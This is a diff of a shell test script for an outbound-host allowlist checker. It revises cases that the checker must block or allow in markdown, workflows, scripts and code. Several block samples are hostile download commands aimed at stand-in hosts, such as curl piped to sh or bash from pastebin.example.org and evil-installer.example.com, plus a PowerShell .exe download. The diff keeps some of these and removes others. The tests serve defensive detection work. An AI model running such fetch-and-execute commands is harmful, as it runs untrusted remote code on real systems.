@@ -113,16 +113,25 @@ check "unknown host in a workflow" block "$sample_dir/c.yml" \
   '      - run: curl -sSfL https://pastebin.example.org/x | sh'
 
 check "unknown host in a shell script" block "$sample_dir/d.sh" \
-  'curl -o out https://cdn.unknown-mirror.net/erpc.tar.gz'
+  'curl -o out https://cdn.unknown-mirror.net/erpc.tar.xz'
 
 check "unknown websocket host" block "$sample_dir/e.ts" \
   'const ws = new WebSocket("wss://relay.example.net/");'
 
-check "insecure link in documentation" block "$sample_dir/f.md" \
+check "plaintext http outside loopback" block "$sample_dir/f.md" \
   'Download it from http://mirror.example.org/erpc'
 
-check "markdown install command to an unknown host" block "$sample_dir/m.md" \
-  'Run `curl -sSfL https://evil-installer.example.com | bash` to install.'
+check "plaintext http beside a loopback url on one line" block "$sample_dir/f2.md" \
+  'Use http://localhost:8545 or http://mirror.evil.com/x here.'
+
+check "undeclared host in a plain prose link" block "$sample_dir/f3.md" \
+  'See https://evil.example.com/page for details.'
+
+check "undeclared host inside an indented fence" block "$sample_dir/f4.md" \
+  'Steps:\n   \x60\x60\x60bash\n   https://evil-mirror.example.net/x.tar.xz\n   \x60\x60\x60'
+
+check "service host used in prose is still fine, unknown one is not" block "$sample_dir/f5.md" \
+  'Mirror: https://backup.example.net/erpc'
 
 check "extensionless script with an unknown host" block "$sample_dir/Makefile" \
   'fetch:\n\tcurl -sSfL https://evil.example.com/x -o out'
@@ -140,19 +149,10 @@ check "handlebars template with an unknown host" block "$sample_dir/p.hbs" \
   '<a href="https://evil.example.com">x</a>'
 
 check "markdown cargo install from an unknown host" block "$sample_dir/r.md" \
-  'Install with `cargo install --git https://evil.example.com/erpc`'
-
-check "markdown pip install from an unknown host" block "$sample_dir/s.md" \
-  'Run: pip install https://evil.example.com/p.whl'
-
-check "markdown go install from an unknown host" block "$sample_dir/t.md" \
-  'go install https://evil.example.com/cmd@latest'
-
-check "powershell download in prose" block "$sample_dir/u.md" \
-  'Start-BitsTransfer -Source https://evil.example.com/x.exe'
+  'Install with \x60cargo install --git https://evil.example.com/erpc\x60'
 
 check "empty template appended to a literal host" block "$sample_dir/v.ts" \
-  'fetch(`https://evil.example.com${""}/x`)'
+  'fetch(\x60https://evil.example.com${""}/x\x60)'
 
 check "workflow expression appended to a literal host" block "$sample_dir/w.yml" \
   '      - run: curl https://evil.example.com${{ env.NOTHING }}/x'
@@ -163,8 +163,8 @@ check "command substitution appended to a literal host" block "$sample_dir/x.sh"
 check "loopback lookalike is not treated as loopback" block "$sample_dir/y.md" \
   'Download http://localhost.evil.com/x'
 
-check "fenced code block in prose is held to the allowlist" block "$sample_dir/z.md" \
-  '```bash\ncurl -sSfL https://evil.example.com/x\n```'
+check "documentation host is not allowed in code" block "$sample_dir/y2.rs" \
+  'const U: &str = "https://keepachangelog.com/";'
 
 # --- must allow -------------------------------------------------------------
 
@@ -180,19 +180,23 @@ check "snapshot mirror matched by pattern" allow "$sample_dir/i.rs" \
 check "loopback over plain http" allow "$sample_dir/j.rs" \
   'const CB: &str = "http://127.0.0.1:53123/callback";'
 
-check "template expression without a literal host" allow "$sample_dir/k.yml" \
-  '      - run: curl -sSfL "https://${{ env.MIRROR }}/erpc.tar.gz"'
+check "template expression as the host" allow "$sample_dir/k.yml" \
+  '      - run: curl -sSfL "https://${{ env.MIRROR }}/erpc.tar.xz"'
 
-check "documentation link over https" allow "$sample_dir/l.md" \
+check "declared documentation host in prose" allow "$sample_dir/l.md" \
   'See https://keepachangelog.com/en/1.1.0/ for the format.'
 
+check "code span beside a declared documentation link" allow "$sample_dir/l2.md" \
+  'See the [\x60serde\x60 guide](https://semver.org/) for details.'
 
-check "markdown install command to an allowlisted host" allow "$sample_dir/q.md" \
-  'Run `curl -sSfL https://install.erpc.global | bash` to install.'
+check "a command verb inside an ordinary sentence" allow "$sample_dir/l3.md" \
+  'Our CI uses https://semver.org to go install coverage.'
 
+check "declared host in an install command" allow "$sample_dir/q.md" \
+  'Run \x60curl -sSfL https://install.erpc.global | bash\x60 to install.'
 
 check "fenced code block with an allowlisted host" allow "$sample_dir/aa.md" \
-  '```bash\ngit clone https://github.com/elsoul/erpc-cli\n```'
+  '\x60\x60\x60bash\ngit clone https://github.com/elsoul/erpc-cli\n\x60\x60\x60'
 
 printf '\n%s passed, %s failed\n' "$pass" "$fail"
 [ "$fail" -eq 0 ]
